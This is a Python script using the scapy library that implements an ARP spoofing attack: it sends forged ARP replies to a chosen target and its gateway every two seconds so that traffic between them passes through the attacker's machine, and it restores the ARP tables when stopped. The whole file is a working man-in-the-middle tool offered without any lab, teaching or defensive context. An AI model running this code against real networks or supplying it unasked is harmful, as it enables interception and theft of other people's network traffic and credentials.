#!/usr/bin/env python3

import time
from scapy.all import ARP, Ether, srp, send
import sys

class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        self.spoofing = False
        
    def get_mac(self, ip):
        '''
        Get the MAC address of the target or gateway
        '''
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        try:
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            print(f"[!] Could not get MAC address for {ip}")
            sys.exit(1)

    def spoof(self, target_ip, spoof_ip):
        '''
        Send a spoofed ARP packet to the target or gateway
        '''
        packet = ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip),
                    psrc=spoof_ip)
        send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        '''
        Restore the ARP tables of the target and gateway
        '''
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                    psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False, count=4)

    def start(self):
        self.spoofing = True
        print(f"[*] Starting ARP spoofing attack...")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        
        try:
            while self.spoofing:
                # Make the target think we are the gateway
                self.spoof(self.target_ip, self.gateway_ip)
                # Make the gateway think we are the target
                self.spoof(self.gateway_ip, self.target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        print("\n[*] Stopping ARP spoofing attack...")
        self.spoofing = False
        # Restore ARP tables
        self.restore(self.target_ip, self.gateway_ip)
        self.restore(self.gateway_ip, self.target_ip)
        print("[*] ARP tables restored") 